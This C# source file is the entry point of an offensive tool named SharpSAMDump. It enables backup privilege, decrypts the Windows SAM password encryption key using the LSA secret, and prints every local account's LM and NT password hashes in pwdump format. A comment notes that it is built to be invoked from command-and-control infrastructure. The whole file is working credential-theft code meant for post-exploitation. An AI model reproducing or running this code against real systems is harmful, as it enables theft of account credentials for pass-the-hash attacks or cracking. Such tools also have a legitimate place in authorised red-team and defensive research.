using System;

namespace SharpSAMDump
{
    public class Program
    {
        public static void Main(string[] args)
        {
#if DEBUG
            // no wrapping in debug mode so that exceptions are caught by the debugger
            SAMDump();
#else
            // try-catch wrapped execution for invocations from C2
            SAMDumpIgnoringExceptions();
#endif
        }

        private static void SAMDumpIgnoringExceptions()
        {
            try
            {
                SAMDump();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
                Console.WriteLine(ex.StackTrace);
            }
        }

        public static void SAMDump()
        {
            Privileges.EnablePrivilege(Privileges.SeBackupPrivilege);

            byte[] blankLM = Util.FromHexString("aad3b435b51404eeaad3b435b51404ee");
            byte[] blankNT = Util.FromHexString("31d6cfe0d16ae931b73c59d7e0c089c0");

            byte[] samKey = SAM.GetEncryptedPasswordEncryptionKey();
            byte[] lsaKey = LSA.GetSecretKey();
            byte[] passwordEncryptionKey = Crypto.UnprotectPasswordEncryptionKey(samKey, lsaKey);
        
            foreach (SAMEntry entry in SAM.GetEntries())
            {
                byte[] lmHash = Crypto.UnprotectNTHash(passwordEncryptionKey, entry.EncryptedLMHash, entry.Rid);
                if (lmHash == null)
                {
                    lmHash = blankLM;
                }

                byte[] ntHash = Crypto.UnprotectNTHash(passwordEncryptionKey, entry.EncryptedNTHash, entry.Rid);
                if (ntHash == null)
                {
                    ntHash = blankNT;
                }

                Console.WriteLine($"{entry.AccountName}:{entry.Rid}:{Util.ToHexString(lmHash)}:{Util.ToHexString(ntHash)}:::");
            }
        }
    }
}
